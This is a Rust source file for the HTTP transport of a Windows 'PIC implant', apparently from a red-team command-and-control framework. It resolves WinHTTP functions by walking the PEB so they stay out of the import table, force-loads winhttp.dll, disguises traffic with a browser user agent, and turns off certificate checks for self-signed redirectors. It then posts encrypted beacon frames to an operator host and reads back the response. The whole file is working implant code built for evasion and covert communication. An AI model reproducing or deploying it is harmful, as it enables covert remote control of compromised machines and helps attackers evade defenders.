//! WinHTTP transport for the PIC implant.
//!
//! `no_std` can't use `ureq`/`rquest` (they're std), so beacon HTTP goes through
//! Win32 WinHTTP -- resolved via PEB walk (no IAT). Sends an encrypted frame as
//! an HTTP POST body and reads the response.
//!
//! All WinHTTP functions resolved from winhttp.dll via the PEB-walk export
//! resolver. TLS is selected per-build via the `use_tls` config flag: when set,
//! `WinHttpOpenRequest` is given `WINHTTP_FLAG_SECURE` (0x00800000) so the
//! request is sent over HTTPS. Ignored-certificate-error handling is wired so
//! self-signed redirector certs don't abort the beacon (an engagement reality).

#![cfg(target_os = "windows")]

use crate::heap::{vec, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;

/// WinHttpOpenRequest flag: use TLS (HTTPS). When set, WinHTTP performs the
/// TLS handshake and encrypts the body — the plaintext-HTTP IOC (and the
/// readable beacon frame on the wire) disappears.
const WINHTTP_FLAG_SECURE: u32 = 0x0080_0000;

/// WinHttpSetOption option code: control certificate validation behavior.
const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 32;
/// Flags OR'd into WINHTTP_OPTION_SECURITY_FLAGS to ignore cert errors the
/// redirector/self-signed infra would otherwise trip. Engagement-only: this
/// trusts whatever cert the server presents, so MITM is possible — acceptable
/// when the operator controls the redirector path.
const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x0000_0100;
const SECURITY_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x0000_2000;
const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x0000_1000;

/// WinHTTP function pointer table (resolved lazily, cached in statics).
struct WinhttpFns {
    open: FOpen,
    connect: FConnect,
    open_request: FOpenReq,
    /// Optional: only needed to relax cert validation for TLS w/ self-signed
    /// redirector. None ⇒ TLS still works for valid-CA certs.
    set_option: Option<FSetOption>,
    send_request: FSendReq,
    receive_response: FRecvResp,
    read_data: FReadData,
    close_handle: FClose,
    query_data: FQueryData,
}

type HINTERNET = *mut c_void;
type FOpen = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
type FConnect = unsafe extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;
type FOpenReq = unsafe extern "system" fn(HINTERNET, *const u16, *const u16, *const u16, *const u16, *const *const u16, u32, u32) -> HINTERNET;
/// WinHttpSetOption(hInternet, dwOption, lpBuffer, dwBufferLength) -> BOOL.
/// Used to relax certificate validation for self-signed redirectors.
type FSetOption = unsafe extern "system" fn(HINTERNET, u32, *const u8, u32) -> i32;
type FSendReq = unsafe extern "system" fn(HINTERNET, *const u8, u32, *const u8, u32, u32, usize) -> i32;
type FRecvResp = unsafe extern "system" fn(HINTERNET, *const c_void) -> i32;
type FReadData = unsafe extern "system" fn(HINTERNET, *mut u8, u32, *mut u32) -> i32;
type FClose = unsafe extern "system" fn(HINTERNET) -> i32;
type FQueryData = unsafe extern "system" fn(HINTERNET, *mut u32) -> i32;

static mut WINHTTP: Option<WinhttpFns> = None;

/// Resolve the WinHTTP function table once (no allocation).
unsafe fn ensure_winhttp() {
    use core::sync::atomic::{AtomicBool, Ordering};
    static DONE: AtomicBool = AtomicBool::new(false);
    if DONE.load(Ordering::Acquire) {
        return;
    }
    // winhttp.dll is NOT loaded by default — resolve LoadLibraryA from
    // kernel32 and force-load it into the process first.
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
    let lla = export_addr(b"kernel32.dll", b"LoadLibraryA");
    let mut winhttp_loaded = false;
    if let Some(addr) = lla {
        let load: LoadLibraryA = core::mem::transmute(addr);
        let name = b"winhttp.dll\0";
        let h = load(name.as_ptr());
        if !h.is_null() {
            winhttp_loaded = true;
        }
    }
    if !winhttp_loaded {
        // Can't load winhttp — transport unavailable.
        DONE.store(true, Ordering::Release);
        return;
    }
    let o = export_addr(b"winhttp.dll", b"WinHttpOpen");
    let c = export_addr(b"winhttp.dll", b"WinHttpConnect");
    let r = export_addr(b"winhttp.dll", b"WinHttpOpenRequest");
    // WinHttpSetOption is optional — only needed when TLS is on and the
    // redirector presents a self-signed cert. If it's absent, TLS still works
    // against valid CAs; we just can't relax cert checking.
    let so = export_addr(b"winhttp.dll", b"WinHttpSetOption");
    let s = export_addr(b"winhttp.dll", b"WinHttpSendRequest");
    let v = export_addr(b"winhttp.dll", b"WinHttpReceiveResponse");
    let d = export_addr(b"winhttp.dll", b"WinHttpReadData");
    let cl = export_addr(b"winhttp.dll", b"WinHttpCloseHandle");
    let q = export_addr(b"winhttp.dll", b"WinHttpQueryDataAvailable");
    if let (Some(o), Some(c), Some(r), Some(s), Some(v), Some(d), Some(cl), Some(q)) =
        (o, c, r, s, v, d, cl, q)
    {
        WINHTTP = Some(WinhttpFns {
            open: core::mem::transmute(o),
            connect: core::mem::transmute(c),
            open_request: core::mem::transmute(r),
            // set_option may be None — handled in post_frame (only called for TLS).
            set_option: match so {
                Some(a) => Some(core::mem::transmute(a)),
                None => None,
            },
            send_request: core::mem::transmute(s),
            receive_response: core::mem::transmute(v),
            read_data: core::mem::transmute(d),
            close_handle: core::mem::transmute(cl),
            query_data: core::mem::transmute(q),
        });
        DONE.store(true, Ordering::Release);
    }
}

/// Convert an ASCII byte string to a UTF-16 buffer (null-terminated) for WinHTTP.
fn to_utf16(s: &[u8]) -> Vec<u16> {
    let mut v = Vec::with_capacity(s.len() + 1);
    for &b in s {
        v.push(b as u16);
    }
    v.push(0);
    v
}

/// Send `body` as an HTTP POST to `host:port/path` and return the response
/// body. `use_tls` selects HTTPS (WINHTTP_FLAG_SECURE) and, when WinHttpSetOption
/// is available, relaxes certificate validation so a self-signed redirector
/// cert doesn't abort the request. Returns None on any failure (the beacon
/// loop retries).
pub unsafe fn post_frame(
    host: &[u8],
    port: u16,
    path: &[u8],
    body: &[u8],
    use_tls: bool,
) -> Option<Vec<u8>> {
    ensure_winhttp();
    let fns = WINHTTP.as_ref()?;
    let ua = to_utf16(b"Mozilla/5.0");
    // WinHttpOpen: WINHTTP_ACCESS_TYPE_DEFAULT_PROXY=0, flags=0.
    let session = (fns.open)(ua.as_ptr(), 0, core::ptr::null(), core::ptr::null(), 0);
    if session.is_null() {
        return None;
    }
    let host16 = to_utf16(host);
    let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
    if conn.is_null() {
        (fns.close_handle)(session);
        return None;
    }
    let path16 = to_utf16(path);
    let verb = to_utf16(b"POST");
    // WinHttpOpenRequest: WINHTTP_FLAG_SECURE (0x00800000) when use_tls, else 0.
    let secure_flag = if use_tls { WINHTTP_FLAG_SECURE } else { 0 };
    let req = (fns.open_request)(
        conn,
        verb.as_ptr(),
        path16.as_ptr(),
        core::ptr::null(),
        core::ptr::null(),
        core::ptr::null(),
        0,
        secure_flag,
    );
    if req.is_null() {
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    // For HTTPS, relax certificate validation (engagement reality: the redirector
    // frequently presents a self-signed cert). Only if WinHttpSetOption resolved.
    // If it resolved but FAILED to set the option, we treat that as fatal:
    // proceeding would send the request with strict validation, the self-signed
    // redirector's handshake would fail, post_frame would return None, and the
    // beacon would retry forever with no indication WHY — a silent death. Fail
    // fast here so the operator sees the request never land.
    if use_tls {
        if let Some(set_option) = fns.set_option {
            let flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
            if set_option(
                req,
                WINHTTP_OPTION_SECURITY_FLAGS,
                &flags as *const u32 as *const u8,
                4,
            ) == 0
            {
                // WinHttpSetOption failed (BOOL == 0). Bail rather than send
                // with strict validation.
                (fns.close_handle)(req);
                (fns.close_handle)(conn);
                (fns.close_handle)(session);
                return None;
            }
        }
        // If set_option is None (WinHttpSetOption export unresolved), proceed —
        // TLS still works for valid-CA certs; only self-signed would fail at
        // handshake, and that surfaces as a normal retry, not a silent stall.
    }
    // WinHttpSendRequest: no extra headers; body in optional section.
    let ok = (fns.send_request)(
        req,
        core::ptr::null(),
        0,
        body.as_ptr(),
        body.len() as u32,
        body.len() as u32,
        0,
    );
    if ok == 0 {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    // WinHttpReceiveResponse.
    if (fns.receive_response)(req, core::ptr::null()) == 0 {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    // Read the response body.
    let mut out: Vec<u8> = Vec::new();
    let mut avail: u32 = 0;
    loop {
        avail = 0;
        if (fns.query_data)(req, &mut avail) == 0 || avail == 0 {
            break;
        }
        // Cap the per-read buffer (and the bytes we ask WinHTTP to fill) at
        // 1 MiB. CRITICAL: dwNumberOfBytesToRead MUST be `capped`, not `avail` —
        // passing the uncapped `avail` (a server/MitM-influenced value) told
        // WinHTTP it could write up to `avail` bytes into a 1 MiB buffer → heap
        // overflow when `avail > 1 << 20`. Clamp `read` to `capped` before
        // slicing too, since read can't exceed what we asked for but we defend
        // in depth against a misbehaving stack.
        let capped = (avail as usize).min(1 << 20);
        let mut chunk = vec![0u8; capped];
        let mut read: u32 = 0;
        if (fns.read_data)(req, chunk.as_mut_ptr(), capped as u32, &mut read) == 0 || read == 0 {
            break;
        }
        let n = (read as usize).min(capped);
        out.extend_from_slice(&chunk[..n]);
    }
    (fns.close_handle)(req);
    (fns.close_handle)(conn);
    (fns.close_handle)(session);
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}
